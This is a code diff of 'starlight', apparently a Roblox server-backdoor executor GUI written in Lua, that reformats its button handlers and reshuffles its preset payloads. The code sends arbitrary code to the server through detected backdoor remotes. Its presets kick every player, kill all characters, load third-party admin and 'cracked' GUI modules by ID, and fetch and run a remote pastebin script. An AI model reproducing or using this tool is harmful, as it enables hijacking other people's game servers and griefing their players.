@@ -545,7 +545,6 @@ Converted["_Presets"].Name = "Presets"
 Converted["_Presets"].Parent = Converted["_Frame"]
 
 -- =============== BARIS 1 (Y = 0.115) ===============
--- Tombol 1: Caducus
 Converted["_Caducus"].Font = Enum.Font.SourceSans
 Converted["_Caducus"].Text = "Caducus"
 Converted["_Caducus"].TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -569,7 +568,6 @@ Converted["_UIStroke8"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233
 Converted["_UIStroke8"].Thickness = 1.5
 Converted["_UIStroke8"].Parent = Converted["_Caducus"]
 
--- Tombol 2: Kick All
 Converted["_Kick"].Font = Enum.Font.SourceSans
 Converted["_Kick"].Text = "Kick All"
 Converted["_Kick"].TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -616,7 +614,6 @@ Converted["_UIStroke10"].Color = Color3.fromRGB(57.00000040233135, 57.0000004023
 Converted["_UIStroke10"].Thickness = 1.5
 Converted["_UIStroke10"].Parent = Converted["_c00l"]
 
--- Tombol 4: SledgeHammer
 Converted["_SledgeHammer"].Font = Enum.Font.SourceSans
 Converted["_SledgeHammer"].Text = "Sledge"
 Converted["_SledgeHammer"].TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -641,7 +638,6 @@ Converted["_UIStroke11"].Thickness = 1.5
 Converted["_UIStroke11"].Parent = Converted["_SledgeHammer"]
 
 -- =============== BARIS 2 (Y = 0.308) ===============
--- Tombol 5: Star
 Converted["_Star"].Font = Enum.Font.SourceSans
 Converted["_Star"].Text = "Hint"
 Converted["_Star"].TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -735,7 +731,6 @@ Converted["_UIStroke15"].Thickness = 1.5
 Converted["_UIStroke15"].Parent = Converted["_ExSer"]
 
 -- =============== BARIS 3 (Y = 0.501) ===============
--- Tombol 9: Grab
 Converted["_Grab"].Font = Enum.Font.SourceSans
 Converted["_Grab"].Text = "Grab"
 Converted["_Grab"].TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -759,7 +754,6 @@ Converted["_UIStroke16"].Color = Color3.fromRGB(57.00000040233135, 57.0000004023
 Converted["_UIStroke16"].Thickness = 1.5
 Converted["_UIStroke16"].Parent = Converted["_Grab"]
 
--- Tombol 10: Ban All
 Converted["_Ban"].Font = Enum.Font.SourceSans
 Converted["_Ban"].Text = "Ban All"
 Converted["_Ban"].TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -785,7 +779,6 @@ Converted["_UIStroke27"].Color = Color3.fromRGB(57, 57, 57)
 Converted["_UIStroke27"].Thickness = 1.5
 Converted["_UIStroke27"].Parent = Converted["_Ban"]
 
--- Tombol 11: Hd Admin
 Converted["_HdAdmin"].Font = Enum.Font.SourceSans
 Converted["_HdAdmin"].Text = "Hd Admin"
 Converted["_HdAdmin"].TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -811,7 +804,6 @@ Converted["_UIStroke28"].Color = Color3.fromRGB(57, 57, 57)
 Converted["_UIStroke28"].Thickness = 1.5
 Converted["_UIStroke28"].Parent = Converted["_HdAdmin"]
 
--- Tombol 12: Team Fat Gui
 Converted["_TeamFatGui"].Font = Enum.Font.SourceSans
 Converted["_TeamFatGui"].Text = "Team Fat"
 Converted["_TeamFatGui"].TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -837,7 +829,7 @@ Converted["_UIStroke29"].Color = Color3.fromRGB(57, 57, 57)
 Converted["_UIStroke29"].Thickness = 1.5
 Converted["_UIStroke29"].Parent = Converted["_TeamFatGui"]
 
--- Tombol 13: Morph Gui
+-- =============== BARIS 4 (Y = 0.694) ===============
 Converted["_MorphGui"].Font = Enum.Font.SourceSans
 Converted["_MorphGui"].Text = "Morph"
 Converted["_MorphGui"].TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -2260,168 +2252,149 @@ local function OHZSZXY_fake_script()
         if not foundExploit then print("💫 starlight: no backdoor found") end
         print(string.format("💫 starlight: scan completed in %.3f seconds", scanTime))
     end
-    
-    local function fireRemoteEvent(code)
-        if remoteEvent then
-            print("ℹ️ Executing code through backdoor:", remoteEvent:GetFullName())
-            remoteEvent:FireServer(code)
-        elseif remoteFunction then
-            print("ℹ️ Executing code through backdoor:", remoteFunction:GetFullName())
-            pcall(function() remoteFunction:InvokeServer('starlightTSS', code) end)
-        else
-            warn("💫 starlight: no backdoor, cannot execute code.")
-            game.StarterGui:SetCore("SendNotification",{
-                Title = "💫 starlight",
-                Text = "no backdoor found, or you didn't scan! - can't run code.",
-                Duration = 12
-            })
-        end
+
+local function fireRemoteEvent(code)
+    if remoteEvent then
+        print("ℹ️ Executing code through backdoor:", remoteEvent:GetFullName())
+        remoteEvent:FireServer(code)
+    elseif remoteFunction then
+        print("ℹ️ Executing code through backdoor:", remoteFunction:GetFullName())
+        pcall(function()
+            remoteFunction:InvokeServer('starlightTSS', code)
+        end)
+    else
+        warn("💫 starlight: no backdoor, cannot execute code.")
+        game.StarterGui:SetCore("SendNotification",{
+            Title = "💫 starlight",
+            Text = "no backdoor found, or you didn't scan! - can't run code.",
+            Duration = 12
+        })
     end
-    
-    script.Parent.Sidebar.Presets.MouseButton1Click:Connect(function()
-        script.Parent.Framee.Visible = false
-        script.Parent.Presets.Visible = true
-        script.Parent.Logs.Visible = false
-    end)
-    
-    script.Parent.Presets.Caducus.MouseButton1Click:Connect(function()
-        script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(5686002742):Fire("' .. game.Players.LocalPlayer.Name .. '","caducus")'
-        script.Parent.Framee.Visible = true
-        script.Parent.Presets.Visible = false
-        script.Parent.Logs.Visible = false
-    end)
-    
-    script.Parent.m.MouseButton1Click:Connect(function()
-        script.Parent.Visible = false
-        script.Parent.Parent.str.Visible = true
-    end)
-    
-    script.Parent.Parent.str.MouseButton1Click:Connect(function()
-        script.Parent.Visible = true
-        script.Parent.Parent.str.Visible = false
-    end)
-    
-    script.Parent.Presets.Kick.MouseButton1Click:Connect(function()
-        script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'for _, player in pairs(game.Players:GetPlayers()) do player:Kick("Kicked by Moon Empty.") end'
-        script.Parent.Framee.Visible = true
-        script.Parent.Presets.Visible = false
-        script.Parent.Logs.Visible = false
-    end)
-    
-    script.Parent.Framee.rsix.MouseButton1Click:Connect(function()
-        fireRemoteEvent('require(3436957371):r6("' .. game.Players.LocalPlayer.Name .. '")')
-    end)
-    
-    script.Parent.Presets.c00l.MouseButton1Click:Connect(function()
-        script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(133464960745567).woawsoc00l("' .. game.Players.LocalPlayer.Name .. '")'
-        script.Parent.Framee.Visible = true
-        script.Parent.Presets.Visible = false
-        script.Parent.Logs.Visible = false
-    end)
-    
-    script.Parent.Presets.SledgeHammer.MouseButton1Click:Connect(function()
-        script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(18665717275):load("' .. game.Players.LocalPlayer.Name .. '")'
-        script.Parent.Framee.Visible = true
-        script.Parent.Presets.Visible = false
-        script.Parent.Logs.Visible = false
-    end)
-    
-    script.Parent.Presets.Star.MouseButton1Click:Connect(function()
-        script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'local h=Instance.new("Hint") h.Parent=workspace h.Text="starlight | the best forever!"'
-        script.Parent.Framee.Visible = true
-        script.Parent.Presets.Visible = false
-        script.Parent.Logs.Visible = false
-    end)
-    
-    script.Parent.Presets.Gui.MouseButton1Click:Connect(function()
-        script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(13581457513):outthemoon("' .. game.Players.LocalPlayer.Name .. '")'
-        script.Parent.Framee.Visible = true
-        script.Parent.Presets.Visible = false
-        script.Parent.Logs.Visible = false
-    end)
-    
-    script.Parent.Presets.Kill.MouseButton1Click:Connect(function()
-        script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'for _, player in pairs(game.Players:GetPlayers()) do player:BreakJoints()'
-        script.Parent.Framee.Visible = true
-        script.Parent.Presets.Visible = false
-        script.Parent.Logs.Visible = false
-    end)
-    
-    script.Parent.Presets.ExSer.MouseButton1Click:Connect(function()
-        script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(10868847330):pls("' .. game.Players.LocalPlayer.Name .. '")'
-        script.Parent.Framee.Visible = true
-        script.Parent.Presets.Visible = false
-        script.Parent.Logs.Visible = false
-    end)
-    
-    script.Parent.Presets.Grab.MouseButton1Click:Connect(function()
-        script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(18665717275).load("' .. game.Players.LocalPlayer.Name .. '")'
-        script.Parent.Framee.Visible = true
-        script.Parent.Presets.Visible = false
-        script.Parent.Logs.Visible = false
-    end)
-    
-    script.Parent.Presets.Ban.MouseButton1Click:Connect(function()
-        script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'loadstring(game:HttpGet("https://pastebin.com/raw/4uYYZXpv"))()'
-        script.Parent.Framee.Visible = true
-        script.Parent.Presets.Visible = false
-        script.Parent.Logs.Visible = false
-    end)
-    
-    script.Parent.Presets.HdAdmin.MouseButton1Click:Connect(function()
-        script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(7192763922).load("' .. game.Players.LocalPlayer.Name .. '")'
-        script.Parent.Framee.Visible = true
-        script.Parent.Presets.Visible = false
-        script.Parent.Logs.Visible = false
-    end)
-    
-    script.Parent.Presets.TeamFatGui.MouseButton1Click:Connect(function()
-        script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(13772265165).TeamFatGUICrackedByLua("' .. game.Players.LocalPlayer.Name .. '")'
-        script.Parent.Framee.Visible = true
-        script.Parent.Presets.Visible = false
-        script.Parent.Logs.Visible = false
-    end)
-    
-    script.Parent.Presets.MorphGui.MouseButton1Click:Connect(function()
-        script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(124675875890869).load("' .. game.Players.LocalPlayer.Name .. '")'
-        script.Parent.Framee.Visible = true
-        script.Parent.Presets.Visible = false
-        script.Parent.Logs.Visible = false
-    end)
+end
 
-    script.Parent.Presets.Hands.MouseButton1Click:Connect(function()
-        script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(5375399205).Player("' .. game.Players.LocalPlayer.Name .. '")'
-        script.Parent.Framee.Visible = true
-        script.Parent.Presets.Visible = false
-        script.Parent.Logs.Visible = false
-    end)
+script.Parent.Sidebar.Presets.MouseButton1Click:Connect(function()
+    script.Parent.Framee.Visible = false
+    script.Parent.Presets.Visible = true
+    script.Parent.Logs.Visible = false
+end)
 
-    script.Parent.Presets.Goner.MouseButton1Click:Connect(function()
-        script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(4513235536).G("' .. game.Players.LocalPlayer.Name .. '")'
-        script.Parent.Framee.Visible = true
-        script.Parent.Presets.Visible = false
-        script.Parent.Logs.Visible = false
-    end)
+script.Parent.Presets.Caducus.MouseButton1Click:Connect(function()
+    script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(5686002742):Fire("' .. game.Players.LocalPlayer.Name .. '","caducus")'
+    script.Parent.Framee.Visible = true
+    script.Parent.Presets.Visible = false
+    script.Parent.Logs.Visible = false
+end)
 
-    script.Parent.Presets.K00p.MouseButton1Click:Connect(function()
-        script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(17145849501).v9("' .. game.Players.LocalPlayer.Name .. '")'
-        script.Parent.Framee.Visible = true
-        script.Parent.Presets.Visible = false
-        script.Parent.Logs.Visible = false
-    end)
-    
-    script.Parent.Sidebar.Logs.MouseButton1Click:Connect(function()
-        script.Parent.Framee.Visible = false
-        script.Parent.Logs.Visible = true
-        script.Parent.Presets.Visible = false
-    end)
-    
-    script.Parent.Sidebar.Executor.MouseButton1Click:Connect(function()
-        script.Parent.Framee.Visible = true
-        script.Parent.Logs.Visible = false
-        script.Parent.Presets.Visible = false
-    end)
-    
+script.Parent.m.MouseButton1Click:Connect(function()
+    script.Parent.Visible = false
+    script.Parent.Parent.str.Visible = true
+end)
+
+script.Parent.Parent.str.MouseButton1Click:Connect(function()
+    script.Parent.Visible = true
+    script.Parent.Parent.str.Visible = false
+end)
+
+script.Parent.Presets.Kick.MouseButton1Click:Connect(function()
+    script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'for _, player in pairs(game.Players:GetPlayers()) do player:Kick("Kicked by Moon Empty.") end'
+    script.Parent.Framee.Visible = true
+    script.Parent.Presets.Visible = false
+    script.Parent.Logs.Visible = false
+end)
+
+script.Parent.Presets.c00l.MouseButton1Click:Connect(function()
+    script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(133464960745567).woawsoc00l("' .. game.Players.LocalPlayer.Name .. '")'
+    script.Parent.Framee.Visible = true
+    script.Parent.Presets.Visible = false
+    script.Parent.Logs.Visible = false
+end)
+
+script.Parent.Framee.rsix.MouseButton1Click:Connect(function()
+    fireRemoteEvent('require(3436957371):r6("' .. game.Players.LocalPlayer.Name .. '")')
+end)
+
+script.Parent.Presets.SledgeHammer.MouseButton1Click:Connect(function()
+    script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(10868847330):pls("' .. game.Players.LocalPlayer.Name .. '")'
+    script.Parent.Framee.Visible = true
+    script.Parent.Presets.Visible = false
+    script.Parent.Logs.Visible = false
+end)
+
+script.Parent.Presets.Star.MouseButton1Click:Connect(function()
+    script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'local h=Instance.new("Hint") h.Parent=workspace h.Text="starlight | the best forever!"'
+    script.Parent.Framee.Visible = true
+    script.Parent.Presets.Visible = false
+    script.Parent.Logs.Visible = false
+end)
+
+script.Parent.Presets.Kill.MouseButton1Click:Connect(function()
+    script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'for _, player in pairs(game.Players:GetPlayers()) do player:BreakJoints()'
+    script.Parent.Framee.Visible = true
+    script.Parent.Presets.Visible = false
+    script.Parent.Logs.Visible = false
+end)
+
+script.Parent.Presets.ExSer.MouseButton1Click:Connect(function()
+    script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(18665717275):load("' .. game.Players.LocalPlayer.Name .. '")'
+    script.Parent.Framee.Visible = true
+    script.Parent.Presets.Visible = false
+    script.Parent.Logs.Visible = false
+end)
+
+script.Parent.Presets.Grab.MouseButton1Click:Connect(function()
+    script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(7192763922):load("' .. game.Players.LocalPlayer.Name .. '")'
+    script.Parent.Framee.Visible = true
+    script.Parent.Presets.Visible = false
+    script.Parent.Logs.Visible = false
+end)
+
+script.Parent.Presets.Ban.MouseButton1Click:Connect(function()
+    script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'loadstring(game:HttpGet("https://pastebin.com/raw/4uYYZXpv"))()'
+    script.Parent.Framee.Visible = true
+    script.Parent.Presets.Visible = false
+    script.Parent.Logs.Visible = false
+end)
+
+script.Parent.Presets.HdAdmin.MouseButton1Click:Connect(function()
+    script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(7192763922).load("' .. game.Players.LocalPlayer.Name .. '")'
+    script.Parent.Framee.Visible = true
+    script.Parent.Presets.Visible = false
+    script.Parent.Logs.Visible = false
+end)
+
+script.Parent.Presets.TeamFatGui.MouseButton1Click:Connect(function()
+    script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(13772265165).TeamFatGUICrackedByLua("' .. game.Players.LocalPlayer.Name .. '")'
+    script.Parent.Framee.Visible = true
+    script.Parent.Presets.Visible = false
+    script.Parent.Logs.Visible = false
+end)
+
+script.Parent.Presets.MorphGui.MouseButton1Click:Connect(function()
+    script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(124675875890869).load("' .. game.Players.LocalPlayer.Name .. '")'
+    script.Parent.Framee.Visible = true
+    script.Parent.Presets.Visible = false
+    script.Parent.Logs.Visible = false
+end)
+
+script.Parent.Presets.Hands.MouseButton1Click:Connect(function()
+    script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(5375399205).Player("' .. game.Players.LocalPlayer.Name .. '")'
+    script.Parent.Framee.Visible = true
+    script.Parent.Presets.Visible = false
+    script.Parent.Logs.Visible = false
+end)
+
+script.Parent.Sidebar.Logs.MouseButton1Click:Connect(function()
+    script.Parent.Framee.Visible = false
+    script.Parent.Logs.Visible = true
+    script.Parent.Presets.Visible = false
+end)
+
+script.Parent.Sidebar.Executor.MouseButton1Click:Connect(function()
+    script.Parent.Framee.Visible = true
+    script.Parent.Logs.Visible = false
+    script.Parent.Presets.Visible = false
+end)
+
     script.Parent.Logs.ToggleMode.MouseButton1Click:Connect(function()
         if remoteFunction or remoteEvent then
             game.StarterGui:SetCore("SendNotification",{
